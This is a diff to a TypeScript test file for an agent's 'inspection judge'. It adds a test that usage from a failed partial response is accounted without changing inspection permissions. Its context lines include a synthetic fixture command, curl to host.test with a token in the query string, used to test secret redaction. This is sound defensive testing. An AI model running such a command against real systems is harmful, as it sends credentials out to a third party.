@@ -2,6 +2,7 @@ import type { ExtensionContext } from "@earendil-works/pi-coding-agent";
 import type { AssistantMessage } from "@earendil-works/pi-ai";
 import { describe, expect, it, vi } from "vitest";
 import { projectInspectionEvidence, reviewInspection } from "../../lib/damage-control/inspection-judge.ts";
+import * as accounting from "../../lib/bedrock/accounting.ts";
 import { modelFixture, registryFixture } from "../helpers/model-selection.ts";
 import type { InspectionEvidence, PendingCall, Settings } from "../../lib/damage-control/types.ts";
 
@@ -24,6 +25,17 @@ function context(complete: ReturnType<typeof vi.fn<ExtensionContext["modelRegist
 const observation = { verdict: "observation", reason: "The complete request and source only retrieve response data." };
 
 describe("Explorer inspection judge", () => {
+  it("accounts actual failed partial response usage without changing inspection permissions", async () => {
+    const account = vi.spyOn(accounting, "accountBedrockMessage").mockResolvedValue(undefined);
+    try {
+      const partial = { ...message(observation, "error"), provider: "bedrock-mantle", responseModel: "actual-route" };
+      const complete = vi.fn().mockResolvedValue(partial);
+      const ctx = { ...context(complete), sessionManager: { getSessionFile: () => "inspection-origin.jsonl" } as ExtensionContext["sessionManager"] };
+      expect((await reviewInspection(evidence(), ctx, settings, pending, () => 4)).status).toBe("unavailable");
+      expect(account).toHaveBeenCalledExactlyOnceWith(partial, "inspection-origin.jsonl");
+    } finally { account.mockRestore(); }
+  });
+
   it("projects only the whole pending call and controlled source, redacting outbound secrets", () => {
     const input = evidence();
     input.request.input = { command: "curl https://host.test?token=SYNTHETIC_SECRET" };
